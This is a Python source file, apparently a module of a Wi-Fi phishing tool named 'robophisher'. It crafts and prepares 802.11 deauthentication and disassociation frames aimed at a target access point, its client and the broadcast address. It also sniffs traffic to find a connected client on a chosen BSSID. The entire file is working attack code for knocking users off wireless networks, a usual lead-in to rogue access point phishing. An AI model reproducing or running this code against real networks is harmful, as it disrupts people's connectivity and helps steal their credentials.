"""
Extension that sends 3 DEAUTH/DISAS Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import scapy.layers.dot11 as dot11
import robophisher.common.constants as constants


def craft_deauth_packet(sender, receiver, bssid):
    """
    Return a deauthentication packet crafted with given information

    :param sender: The MAC address of the sender
    :param receiver: The MAC address of the receiver
    :param bssid: The MAC address of the AccessPoint
    :type sender: str
    :type receiver: str
    :type bssid: str
    :return: A deauthentication packet
    :rtype: scapy.layers.dot11.RadioTap
    """
    return (dot11.RadioTap() / dot11.Dot11(
        type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid) / dot11.Dot11Deauth())


def craft_disas_packet(sender, receiver, bssid):
    """
    Return a disassociation packet crafted with given information

    :param sender: The MAC address of the sender
    :param receiver: The MAC address of the receiver
    :param bssid: The MAC address of the AccessPoint
    :type sender: str
    :type receiver: str
    :type bssid: str
    :return: A disassociation packet
    :rtype: scapy.layers.dot11.RadioTap
    """
    return (dot11.RadioTap() / dot11.Dot11(
        type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid) / dot11.Dot11Disas())


def craft_packets(client, access_point):
    """
    Craft the following packets:
        1. Deauthentication from AP to client
        2. Deauthentication from client to AP
        3. Deauthentication from AP to broadcast
        4. Disassosiation from AP to client
        5. Disassosiation from client to AP
        6. Disassosiation from AP to broadcast

    :param client: BSSID of client
    :param access_point: BSSID of target access point
    :type client: str
    :type access_point: str
    :return: A list of deauthentication and disassosiation packets
    :rtype: list
    """
    broadcast = "ff:ff:ff:ff:ff:ff"
    return [
        craft_deauth_packet(access_point, client, access_point),
        craft_deauth_packet(client, access_point, access_point),
        craft_deauth_packet(access_point, broadcast, access_point),
        craft_disas_packet(access_point, client, access_point),
        craft_disas_packet(client, access_point, access_point),
        craft_disas_packet(access_point, broadcast, access_point)
    ]


def find_client(bssid, l2socket):
    """
    Try to find a client using the bssid given.

    :param bssid: The bssid of the target access point
    :param l2socket: A socket to listen to packets
    :type bssid: str
    :type l2socket: L2ListenSocket
    :return: A client if found or None otherwise
    :rtype: str or None
    :Example:

        >>> import scapy.arch.linux as linux
        >>> interface = "wlan0"
        >>> bssid = "00:11:22:33:44:55"
        >>> socket = linux.L2ListenSocket(iface=interface)
        >>>
        >>> find_client(bssid, socket)
        "12:34:56:78:90:AB"
        >>> find_client(bssid, socket)
        None
    """
    packet = l2socket.sniff(count=1, lfilter=is_packet_relevant)[0]
    return (packet.addr3 == bssid and ((packet.addr2 == bssid and packet.addr1) or packet.addr2)
            or None)


def is_packet_relevant(packet):
    """
    Check if the provided packet is valid based on:
        1. packet is not malformed
        2. packet has valid channel
        3. packet has type data

    :param packet: A packet to check against
    :type packet: scapy.layers.dot11.RadioTap
    :return: True if packet passes requirements and False otherwise
    :rtype: bool
    :Example:

        >>> import scapy.layers.dot11 as dot11
        >>>
        >>> packet = dot11.sniff(iface="wlan0", count=1)[0]
        >>> is_packet_relevant(packet)
        True
    """
    # TODO this function should be refactored with the one in the recon
    return (hasattr(packet.payload, "info") and packet.info and not packet.info.startswith('\x00')
            and len(packet[dot11.Dot11Elt:3].info) == 1 and packet.type == 2
            and ord(packet[dot11.Dot11Elt:3].info) in constants.ALL_2G_CHANNELS)
